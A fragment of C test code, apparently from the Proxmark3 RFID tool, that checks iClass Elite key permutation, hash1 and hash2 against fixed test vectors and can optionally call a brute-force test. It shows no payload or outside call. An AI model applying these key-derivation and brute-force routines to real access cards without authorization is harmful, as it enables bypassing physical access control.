    if (memcmp(testcase, testcase_output_rev, 8) != 0) {
        PrintAndLogEx(ERR, "Error with reverse iclass key permute");
        printarr("testcase", testcase, 8);
        printarr("testcase_output_rev", testcase_output_rev, 8);
        return PM3_ESOFT;
    }

    PrintAndLogEx(SUCCESS, "    Iclass key permutation ( %s )", _GREEN_("ok"));
    return PM3_SUCCESS;
}

static int _testHash1(void) {
    uint8_t expected[8] = {0x7E, 0x72, 0x2F, 0x40, 0x2D, 0x02, 0x51, 0x42};
    uint8_t csn[8] = {0x01, 0x02, 0x03, 0x04, 0xF7, 0xFF, 0x12, 0xE0};
    uint8_t k[8] = {0};
    hash1(csn, k);

    if (memcmp(k, expected, 8) != 0) {
        PrintAndLogEx(ERR, "Error with hash1!");
        printarr("calculated", k, 8);
        printarr("expected", expected, 8);
        return PM3_ESOFT;
    }
    return PM3_SUCCESS;
}

int testElite(bool slowtests) {
    PrintAndLogEx(INFO, "Testing iClass Elite functionality");
    PrintAndLogEx(INFO, "Testing hash2...");
    uint8_t k_cus[8] = {0x5B, 0x7C, 0x62, 0xC4, 0x91, 0xC1, 0x1B, 0x39};

    /**
     *Expected:
     * High Security Key Table

    00  F1 35 59 A1 0D 5A 26 7F 18 60 0B 96 8A C0 25 C1
    10  BF A1 3B B0 FF 85 28 75 F2 1F C6 8F 0E 74 8F 21
    20  14 7A 55 16 C8 A9 7D B3 13 0C 5D C9 31 8D A9 B2
    30  A3 56 83 0F 55 7E DE 45 71 21 D2 6D C1 57 1C 9C
    40  78 2F 64 51 42 7B 64 30 FA 26 51 76 D3 E0 FB B6
    50  31 9F BF 2F 7E 4F 94 B4 BD 4F 75 91 E3 1B EB 42
    60  3F 88 6F B8 6C 2C 93 0D 69 2C D5 20 3C C1 61 95
    70  43 08 A0 2F FE B3 26 D7 98 0B 34 7B 47 70 A0 AB

    **** The 64-bit HS Custom Key Value = 5B7C62C491C11B39 ****
     */
    uint8_t keytable[128] = {0};
    hash2(k_cus, keytable);
    printarr_human_readable("---------------------- Hash2 ----------------------", keytable, sizeof(keytable));
    if (keytable[3] == 0xA1 && keytable[0x30] == 0xA3 && keytable[0x6F] == 0x95) {
        PrintAndLogEx(SUCCESS, "    hash2 ( %s )", _GREEN_("ok"));
    }

    int res = PM3_SUCCESS;
    PrintAndLogEx(INFO, "Testing hash1...");
    res += _testHash1();
    PrintAndLogEx((res == PM3_SUCCESS) ? SUCCESS : WARNING, "    hash1 ( %s )", (res == PM3_SUCCESS) ? _GREEN_("ok") : _RED_("fail"));

    PrintAndLogEx(INFO, "Testing key diversification...");
    res += _test_iclass_key_permutation();
    PrintAndLogEx((res == PM3_SUCCESS) ? SUCCESS : WARNING, "    key diversification ( %s )", (res == PM3_SUCCESS) ? _GREEN_("ok") : _RED_("fail"));

    if (slowtests)
        res += _testBruteforce();

    return res;
}
